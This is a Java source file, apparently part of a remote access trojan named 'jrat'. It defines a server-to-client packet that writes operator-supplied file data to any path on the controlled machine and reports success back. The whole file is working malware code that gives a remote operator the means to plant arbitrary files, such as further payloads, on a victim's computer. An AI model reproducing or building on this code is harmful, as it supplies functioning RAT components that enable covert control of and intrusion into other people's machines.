package net.jrat.core.packet.server;

import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;

import net.jrat.core.Client;
import net.jrat.core.packet.IPacket;
import net.jrat.core.packet.client.C1PacketMessage;
import net.jrat.utils.Variables;

public class S7PacketUpload implements IPacket
{
	private static final long serialVersionUID = 1L;
	
	private byte[] filedata;
	private String outputpath;
	
	@Override
	public void execute(Object object) throws Exception
	{
		final String filepath = this.outputpath == null ? Variables.instance.workDir + "uploaded.file" : this.outputpath;
		final File file = new File(filepath);
		
		if(!(file.exists()))
		{
			file.getParentFile().mkdirs();
			file.createNewFile();
		}
		
		final BufferedOutputStream writer = new BufferedOutputStream(new FileOutputStream(file));
		writer.write(this.filedata);
		writer.close();
		
		Client.instance.outputStream.writeObject(new C1PacketMessage("successfully recived! file: " + filepath));
	}
}